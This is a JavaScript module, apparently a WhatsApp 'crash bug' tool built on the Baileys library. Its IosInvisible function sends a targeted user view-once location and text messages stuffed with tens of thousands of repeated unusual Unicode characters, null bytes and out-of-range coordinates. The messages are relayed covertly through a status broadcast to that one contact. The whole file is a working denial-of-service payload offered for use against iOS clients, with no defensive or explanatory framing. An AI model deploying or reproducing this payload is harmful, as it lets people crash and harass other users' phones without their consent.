const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

async function IosInvisible(client, targetJid) {
  try {
    let locationMessage = {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
      address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
      url: `https://kominfo.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
    };

    let extendMsg = {
      extendedTextMessage: {
        text: ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
        matchedText: ".welcomel...",
        description: "𑇂𑆵𑆴𑆿".repeat(25000),
        title: "𑇂𑆵𑆴𑆿".repeat(15000),
        previewType: "NONE",
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    };

    let msg1 = generateWAMessageFromContent(targetJid, {
      viewOnceMessage: { message: { locationMessage } }
    }, {});

    let msg2 = generateWAMessageFromContent(targetJid, {
      viewOnceMessage: { message: { extendMsg } }
    }, {});

    for (const msg of [msg1, msg2]) {
      await client.relayMessage('status@broadcast', msg.message, {
        messageId: msg.key.id,
        statusJidList: [targetJid],
        additionalNodes: [{
          tag: 'meta',
          attrs: {},
          content: [{
            tag: 'mentioned_users',
            attrs: {},
            content: [{
              tag: 'to',
              attrs: { jid: targetJid },
              content: undefined
            }]
          }]
        }]
      });
    }
  } catch (err) {
    console.error(err);
  }
}

module.exports = { IosInvisible };
